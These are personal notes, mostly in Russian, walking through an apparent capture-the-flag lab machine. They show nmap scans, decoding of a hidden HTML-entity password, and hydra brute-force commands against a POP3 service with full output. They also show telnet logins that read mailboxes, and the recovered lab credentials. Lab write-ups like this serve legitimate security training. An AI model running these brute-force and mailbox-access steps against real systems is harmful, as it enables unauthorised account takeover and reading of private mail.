
nmap -sC -sV ip - не дал результата, нашел два порта, платформа не приняла ответ

=nmap -A -T4 ip - тоже нет 

nmap -p- -Pn ip - дал 4 порта 

25, 80, 55006, 55007

55007 - pop3

gobuster и dirsearch - не дали результата, просто не сработали

зашла по ip в браузере, на страние смотрим код 

на странице обнаружен js скрипт, открыла 

найдена закодированная строка - &#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114
HTML entity decoder - InvincibleHack3r

Борис не обновил пароль 

login ip/sev-home/

telnet 10.10.237.59 55007 
user boris
pass InvincibleHack3r - fail

Supervisors: Boris & Natalya 
найдены в коде на странице - ip/sev-home/

hydra -l Boris -P /usr/share/wordlists/fasttrack.txt -f 10.10.237.59 -s 55007 pop3

--
root@ip-10-10-217-164:~# hydra -l Boris -P /usr/share/wordlists/fasttrack.txt -f 10.10.237.59 -s 55007 pop3
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-24 14:06:37
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3://10.10.237.59:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[STATUS] 72.00 tries/min, 144 tries in 00:02h, 78 to do in 00:02h, 16 active
[55007][pop3] host: 10.10.237.59   login: Boris   password: secret1!
[STATUS] attack finished for 10.10.237.59 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-24 14:09:10
--

telnet 10.10.237.59 55007 
user boris 
pass secret1!

list

выдал 3 месседжа

retr 1
retr 2
retr 3

ничего интересного, кроме того что В третьем файле важная информация была отправлена пользователем «alec».
Другими словами, в системе есть и другие имена пользователей, помимо «boris». 

hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f 10.10.237.59 -s 55007 pop3

telnet 10.10.237.59 55007 
user natalya 
pass bird

тоже самое 
лист
ретр

found 
Xenia 
RCP90rulez!

write 
If you're on Linux edit your "/etc/hosts" file and add:

<machines ip> severnaya-station.com

severnaya-station.com/gnocertdir/login/index.php - вот этот момент ваще не поняла 

в профайле есть месседжи

user dr doak

hydra -l doak -P /usr/share/wordlists/fasttrack.txt -f 10.10.237.59 -s 55007 pop3

pass goat

telnet 10.10.237.59 55007 
user doak 
pass goat

list 
retr

username: dr_doak
password: 4England!










